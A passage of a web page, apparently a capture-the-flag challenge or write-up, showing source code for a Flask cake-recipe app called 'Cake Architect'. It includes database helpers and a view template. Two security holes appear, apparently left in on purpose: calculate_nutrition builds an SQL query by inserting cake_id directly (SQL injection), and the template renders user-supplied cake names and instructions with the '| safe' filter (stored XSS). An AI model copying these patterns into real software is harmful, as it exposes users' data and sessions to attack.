            <span class="n">ingredients_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">cake</span><span class="p">[</span><span class="sh">'</span><span class="s">ingredients</span><span class="sh">'</span><span class="p">])</span>
            <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"""</span><span class="s">
                INSERT INTO cakes (name, ingredients, instructions, created_by, is_public) 
                VALUES (%s, %s, %s, %s, %s)
                ON CONFLICT DO NOTHING
            </span><span class="sh">"""</span><span class="p">,</span> <span class="p">(</span><span class="n">cake</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">],</span> <span class="n">ingredients_json</span><span class="p">,</span> <span class="n">cake</span><span class="p">[</span><span class="sh">'</span><span class="s">instructions</span><span class="sh">'</span><span class="p">],</span> <span class="n">cake</span><span class="p">[</span><span class="sh">'</span><span class="s">created_by</span><span class="sh">'</span><span class="p">],</span> <span class="n">cake</span><span class="p">[</span><span class="sh">'</span><span class="s">is_public</span><span class="sh">'</span><span class="p">]))</span>
        
        <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">✅ Sample cakes created</span><span class="sh">"</span><span class="p">)</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">❌ Error setting up cakes: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">rollback</span><span class="p">()</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_user_by_credentials</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Get user by username and password</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        
        <span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">hash_password</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT id, username, role FROM users WHERE username = %s AND password = %s</span><span class="sh">"</span><span class="p">,</span> 
                   <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">hashed_password</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error getting user: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">role</span><span class="o">=</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Create a new user</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        
        <span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">hash_password</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO users (username, email, password, role) VALUES (%s, %s, %s, %s)</span><span class="sh">"</span><span class="p">,</span>
                   <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">hashed_password</span><span class="p">,</span> <span class="n">role</span><span class="p">))</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">True</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error creating user: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="n">conn</span><span class="p">.</span><span class="nf">rollback</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_user_cakes</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Get cakes for a user (their own + public ones)</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT id, name, created_by FROM cakes WHERE created_by = %s OR is_public = true</span><span class="sh">"</span><span class="p">,</span> 
                   <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
        <span class="k">return</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error getting cakes: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">[]</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_cake_by_id</span><span class="p">(</span><span class="n">cake_id</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Get a cake by ID</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT id, name, ingredients, instructions, created_by, is_public FROM cakes WHERE id = %s</span><span class="sh">"</span><span class="p">,</span> <span class="p">(</span><span class="n">cake_id</span><span class="p">,))</span>
        <span class="k">return</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error getting cake: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">save_cake</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">ingredients</span><span class="p">,</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">created_by</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Save a new cake</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        
        <span class="n">ingredients_json</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">ingredients</span><span class="p">)</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO cakes (name, ingredients, instructions, created_by) VALUES (%s, %s, %s, %s)</span><span class="sh">"</span><span class="p">,</span>
                   <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">ingredients_json</span><span class="p">,</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">created_by</span><span class="p">))</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">True</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error saving cake: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_all_users</span><span class="p">():</span>
    <span class="sh">"""</span><span class="s">Get all users for admin panel</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT id, username, email, role, created_at FROM users ORDER BY created_at DESC</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
        
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error getting users: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">[]</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">calculate_nutrition</span><span class="p">(</span><span class="n">cake_id</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">Calculate nutrition for a cake</span><span class="sh">"""</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>

        <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">SELECT ingredients FROM cakes WHERE id = </span><span class="si">{</span><span class="n">cake_id</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
        <span class="n">plan</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">plan</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Cake not found</span><span class="sh">"</span><span class="p">})</span>

        <span class="c1"># Handle both JSON string and already parsed dict
</span>        <span class="n">ingredients_data</span> <span class="o">=</span> <span class="n">plan</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">ingredients_data</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
            <span class="n">ingredients</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">ingredients_data</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ingredients</span> <span class="o">=</span> <span class="n">ingredients_data</span>  <span class="c1"># Already a dict
</span>            
        <span class="n">total</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">ing</span> <span class="ow">in</span> <span class="n">ingredients</span><span class="p">:</span>
            <span class="c1"># Extract the quantity from strings like "2 cups", "1 cup", "3"
</span>            <span class="n">quantity_str</span> <span class="o">=</span> <span class="n">ingredients</span><span class="p">[</span><span class="n">ing</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">total</span> <span class="o">+=</span> <span class="nf">int</span><span class="p">(</span><span class="n">quantity_str</span><span class="p">)</span>
            <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                <span class="c1"># If we can't parse as int, try to extract number from string
</span>                <span class="kn">import</span> <span class="n">re</span>
                <span class="n">numbers</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">\d+</span><span class="sh">'</span><span class="p">,</span> <span class="n">quantity_str</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">numbers</span><span class="p">:</span>
                    <span class="n">total</span> <span class="o">+=</span> <span class="nf">int</span><span class="p">(</span><span class="n">numbers</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span>
            <span class="sh">"</span><span class="s">cake_id</span><span class="sh">"</span><span class="p">:</span> <span class="n">cake_id</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">calculated</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
                <span class="sh">"</span><span class="s">calories</span><span class="sh">"</span><span class="p">:</span> <span class="n">total</span> <span class="o">*</span> <span class="mi">50</span><span class="p">,</span>
                <span class="sh">"</span><span class="s">fat</span><span class="sh">"</span><span class="p">:</span> <span class="n">total</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span>
                <span class="sh">"</span><span class="s">protein</span><span class="sh">"</span><span class="p">:</span> <span class="n">total</span> <span class="o">*</span> <span class="mf">1.5</span>
            <span class="p">}</span>
        <span class="p">})</span>

    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">)})</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
            <span class="nf">return_db</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="templates">
  <summary>app/templates/view_cake.html</summary>

  <div file="app/templates/view_cake.html" class="language-html highlighter-rouge"><div class="code-header">
        <span data-label-text="app/templates/view_cake.html"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>{{ cake[1] }} - Cake Architect<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;style&gt;</span>
        <span class="nc">.sidebar</span> <span class="p">{</span>
            <span class="nl">min-height</span><span class="p">:</span> <span class="m">100vh</span><span class="p">;</span>
            <span class="nl">background</span><span class="p">:</span> <span class="nf">linear-gradient</span><span class="p">(</span><span class="m">135deg</span><span class="p">,</span> <span class="nx">#667eea</span> <span class="m">0%</span><span class="p">,</span> <span class="nx">#764ba2</span> <span class="m">100%</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nc">.cake-detail</span> <span class="p">{</span>
            <span class="nl">border</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
            <span class="nl">border-radius</span><span class="p">:</span> <span class="m">15px</span><span class="p">;</span>
            <span class="nl">box-shadow</span><span class="p">:</span> <span class="m">0</span> <span class="m">5px</span> <span class="m">15px</span> <span class="nf">rgba</span><span class="p">(</span><span class="m">0</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">0.1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nc">.ingredient-item</span> <span class="p">{</span>
            <span class="nl">background</span><span class="p">:</span> <span class="nx">#f8f9fa</span><span class="p">;</span>
            <span class="nl">border-radius</span><span class="p">:</span> <span class="m">8px</span><span class="p">;</span>
            <span class="nl">padding</span><span class="p">:</span> <span class="m">10px</span><span class="p">;</span>
            <span class="nl">margin</span><span class="p">:</span> <span class="m">5px</span> <span class="m">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="c">&lt;!-- Sidebar --&gt;</span>
            <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"col-md-3 col-lg-2 d-md-block sidebar collapse"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"position-sticky pt-3"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"text-center mb-4"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-birthday-cake fa-2x text-white mb-2"</span><span class="nt">&gt;&lt;/i&gt;</span>
                        <span class="nt">&lt;h5</span> <span class="na">class=</span><span class="s">"text-white"</span><span class="nt">&gt;</span>Cake Architect<span class="nt">&lt;/h5&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                    
                    <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav flex-column"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link text-white"</span> <span class="na">href=</span><span class="s">"/dashboard"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-home me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>
                                Dashboard
                            <span class="nt">&lt;/a&gt;</span>
                        <span class="nt">&lt;/li&gt;</span>
                        <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link text-white"</span> <span class="na">href=</span><span class="s">"/cake-builder"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-plus me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>
                                Create Cake
                            <span class="nt">&lt;/a&gt;</span>
                        <span class="nt">&lt;/li&gt;</span>
                        <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link text-white"</span> <span class="na">href=</span><span class="s">"/report-issue"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-exclamation-triangle me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>
                                Report Issue
                            <span class="nt">&lt;/a&gt;</span>
                        <span class="nt">&lt;/li&gt;</span>
                        {% if user.role == 'admin' %}
                        <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link text-white"</span> <span class="na">href=</span><span class="s">"/admin"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-cog me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>
                                Admin Panel
                            <span class="nt">&lt;/a&gt;</span>
                        <span class="nt">&lt;/li&gt;</span>
                        {% endif %}
                        <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link text-white"</span> <span class="na">href=</span><span class="s">"/logout"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-sign-out-alt me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>
                                Logout
                            <span class="nt">&lt;/a&gt;</span>
                        <span class="nt">&lt;/li&gt;</span>
                    <span class="nt">&lt;/ul&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/nav&gt;</span>

            <span class="c">&lt;!-- Main content --&gt;</span>
            <span class="nt">&lt;main</span> <span class="na">class=</span><span class="s">"col-md-9 ms-sm-auto col-lg-10 px-md-4"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"h2"</span><span class="nt">&gt;</span>Cake Details<span class="nt">&lt;/h1&gt;</span>
                    <span class="nt">&lt;div&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/dashboard"</span> <span class="na">class=</span><span class="s">"btn btn-secondary me-2"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-arrow-left me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>Back to Dashboard
                        <span class="nt">&lt;/a&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/report-issue"</span> <span class="na">class=</span><span class="s">"btn btn-warning"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-exclamation-triangle me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>Report Issue
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>

                {% with messages = get_flashed_messages(with_categories=true) %}
                    {% if messages %}
                        {% for category, message in messages %}
                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-{{ 'danger' if category == 'error' else 'success' }} alert-dismissible fade show"</span> <span class="na">role=</span><span class="s">"alert"</span><span class="nt">&gt;</span>
                                
                                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"btn-close"</span> <span class="na">data-bs-dismiss=</span><span class="s">"alert"</span><span class="nt">&gt;&lt;/button&gt;</span>
                            <span class="nt">&lt;/div&gt;</span>
                        {% endfor %}
                    {% endif %}
                {% endwith %}

                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-12"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card cake-detail"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-header"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;h3&gt;</span>{{ cake[1] | safe }}<span class="nt">&lt;/h3&gt;</span>
                                <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted mb-0"</span><span class="nt">&gt;</span>Created by: <span class="nt">&lt;/p&gt;</span>
                            <span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card-body"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-6"</span><span class="nt">&gt;</span>
                                        <span class="nt">&lt;h5&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-list me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>Ingredients<span class="nt">&lt;/h5&gt;</span>
                                        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"ingredients-list"</span><span class="nt">&gt;</span>
                                            <span class="c">&lt;!-- Ingredients will be loaded here via JavaScript --&gt;</span>
                                        <span class="nt">&lt;/div&gt;</span>
                                    <span class="nt">&lt;/div&gt;</span>
                                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-6"</span><span class="nt">&gt;</span>
                                        <span class="nt">&lt;h5&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-clipboard-list me-2"</span><span class="nt">&gt;&lt;/i&gt;</span>Instructions<span class="nt">&lt;/h5&gt;</span>
                                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"border rounded p-3 bg-light"</span><span class="nt">&gt;</span>
                                            {{ cake[3] | safe if cake[3] else 'No instructions provided.' }}
                                        <span class="nt">&lt;/div&gt;</span>
                                    <span class="nt">&lt;/div&gt;</span>
                                <span class="nt">&lt;/div&gt;</span>
                                
                                <span class="nt">&lt;hr&gt;</span>
                                
                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"d-flex justify-content-between align-items-center"</span><span class="nt">&gt;</span>
                                    <span class="nt">&lt;div&gt;</span>
                                        <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"badge bg-primary"</span><span class="nt">&gt;</span>Cake #<span class="nt">&lt;/span&gt;</span>
                                        {% if cake[5] %}
                                            <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"badge bg-success"</span><span class="nt">&gt;</span>Public<span class="nt">&lt;/span&gt;</span>
